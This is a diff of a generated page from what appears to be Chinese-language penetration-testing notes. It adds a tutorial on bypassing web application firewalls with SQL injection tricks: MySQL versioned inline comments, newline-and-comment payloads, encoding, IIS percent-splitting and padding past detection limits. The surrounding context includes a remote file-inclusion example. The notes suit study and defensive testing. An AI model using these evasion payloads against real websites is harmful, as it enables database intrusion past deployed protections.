@@ -635,14 +635,14 @@
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        18.2k
+                        19.4k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        67 分
+                        71 分
                     </div>
                     
                 
@@ -1702,7 +1702,48 @@ $un -&gt; ();</code></pre><p><strong>反序列化一定要白盒代码审计的<
 
 <p>PHP默认不能包含远程文件，需要开启allow_url_include = On</p>
 <p>在php的配置文件php_ini中可以修改这个，之后就可以在目标服务器上，例：</p>
-<pre><code>&lt;?php require('http://一个公网ip/要包含的文件')?&gt;</code></pre><script>
+<pre><code>&lt;?php require('http://一个公网ip/要包含的文件')?&gt;</code></pre><h2 id="饶WAF（上）"><a href="#饶WAF（上）" class="headerlink" title="饶WAF（上）"></a>饶WAF（上）</h2><h3 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h3><p>介绍Bypass之前，我们先介绍一下什么事WAF</p>
+<p>WAF是一个缩写，他的全名叫做web应用防护系统（web Application Firewall）是通过执行一系列针对HTTP/HTTPS的安全策略来专门为web应用提供保护的一款产品。</p>
+<p>WAF有硬件类型的也有软件类型的，但是其实在我看看来，从绕过WAF机制上来说，区别不大。我们一般渗透测试都会遇到软WAF，应为硬件WAF价格有点昂贵，正常企业不会购买，所以基本上是GOV站点或者国网、运营商等国企才会大规模装配。</p>
+<p>来看看常见的软WAF，常见：安全狗、云锁、悬镜、护卫神、云盾</p>
+<h3 id="Bypass是什么？"><a href="#Bypass是什么？" class="headerlink" title="Bypass是什么？"></a>Bypass是什么？</h3><p>Bypass他就是绕过的意思，我们渗透测试人员通过特殊语句的构建进行渗透测试，然后达到绕过WAF的手法</p>
+<p>WAF检测机制其实很简单，核心就是正则匹配，虽然说还有字符串强行匹配，还有什么语义解析，但是实际上还是正则居多。</p>
+<h3 id="常见饶WAF手法"><a href="#常见饶WAF手法" class="headerlink" title="常见饶WAF手法"></a>常见饶WAF手法</h3><p>记住一句话，安全和客户体验都是需要平衡的，特别是对于WAF而言，你想想，用了WAF之后，然后网页动不动就拦截，比如我是用户，然后因为我用户名叫and然后我被拉黑了，因为我不小心输了个’页面就出问题，这个当然不可以，所以WAF一般都是通用的，并不是单独定制的，既然是通用的，那么他在拦截上会比较谨慎，所以WAF的正则一般是搭配式的。</p>
+<p>我们既然知道WAF通过正则匹配，那么你们第一反应就是，替换函数对不对</p>
+<p>例如：id=1 and 1=1</p>
+<p>WAF对and进行了拦截，那么我们是不是得尝试找到替换and的东西，那么运算符就能榜上我们，例如：&amp;</p>
+<p>但是输入时候我们发现如果只写and是不会被拦截的，那么我们想办法改一改1=1，可以试试-1=-1</p>
+<p>甚至例如直接传参，我使用加减符号，乘除符号运算，或者是字符串传参直接用16进制也可以绕过这个傻狗</p>
+<h4 id="在这里要讲一个东西叫做内联注入。"><a href="#在这里要讲一个东西叫做内联注入。" class="headerlink" title="在这里要讲一个东西叫做内联注入。"></a>在这里要讲一个东西叫做内联注入。</h4><p>内联注入是MySQL为了保持与其它数据兼容，将MySQL中特有的语句放在/*!…*/中，这些语句在不兼容的数据库中不执行，而在MySQL自身却能识别，执行。</p>
+<p>/*!50001*/表示数据库版本=&gt;5.00.01时中间的语句才能被执行。</p>
+<p>在url栏中特殊符号有自己特殊的含义，&amp;就代表连接传参的</p>
+<p>将&amp; url编码再输入就代表数据库中的与运算了，也可以用十六进制0x来试下</p>
+<p>例：id=0x31</p>
+<p>可以不用order by直接union select</p>
+<p>饶WAF支持的编码不多</p>
+<p>拦截了union select 就试一下union all select</p>
+<p>还被拦截就用内联注释</p>
+<br>
+
+<p>/**/：在数据库中代表注释</p>
+<p>/*!*/：是内联注释，内联注释里的SQL语句都会被执行。</p>
+<p>当内联注释union slect /*!select*/也被拦截了，就可以尝试加上版本号，如50001</p>
+<pre><code>union /*!50001select*/</code></pre><p>代表数据库版本为5.00.01时执行</p>
+<p>若还被拦截可以尝试下其他的版本号，如5000，当版本号不存在的时候，虽然不拦截了，但是SQl语句也执行不了，所以爆破版本号是可以的</p>
+<h3 id="常见饶WAF手段"><a href="#常见饶WAF手段" class="headerlink" title="常见饶WAF手段"></a>常见饶WAF手段</h3><p>大小写绕过（很老的WAF才有用）</p>
+<p>替换饶过（很老的WAF才有用）【和上传文件那个pphphp一样】</p>
+<p>特殊字符让过（%0a换行）</p>
+<pre><code>-- qwe/*%0afrom admin %23*/</code></pre><p>%23代表“#”</p>
+<p>因为%0a代表换行，– qwe相当于注释掉/<em>，%23相当于注释掉了\</em>/</p>
+<p>所以安全狗会认为/**/注释里面的东西是安全的</p>
+<p>编码绕过（比如会多次编码的东西）</p>
+<p>等价替换（利用其它函数替代）【union #%0aselect拦截】【union all#0aseelct不拦截】</p>
+<p>容器特性（例如Apace的Hpp，或者是IIS的%分割）</p>
+<p>在IIS里，s%e%l%e%c%t与select是等价的</p>
+<p>Apace里的H匹配是参数污染</p>
+<p>白名单（管理员权限或者是127.0.0.1本地访问不拦截）</p>
+<p>缓冲区（数据太多，超过了WAF检测的范围）【填充大量字符来溢出，例如填入大量注释内容，俺去昂狗大约二四千多个字符就能绕过】</p>
+<script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
             if (!el.dataset.src) { return; }
@@ -2438,7 +2479,7 @@ $un -&gt; ();</code></pre><p><strong>反序列化一定要白盒代码审计的<
 
             
                 &nbsp; | &nbsp;字数统计:&nbsp;
-                <span class="white-color">34.9k</span> 字
+                <span class="white-color">36.1k</span> 字
             
 
             
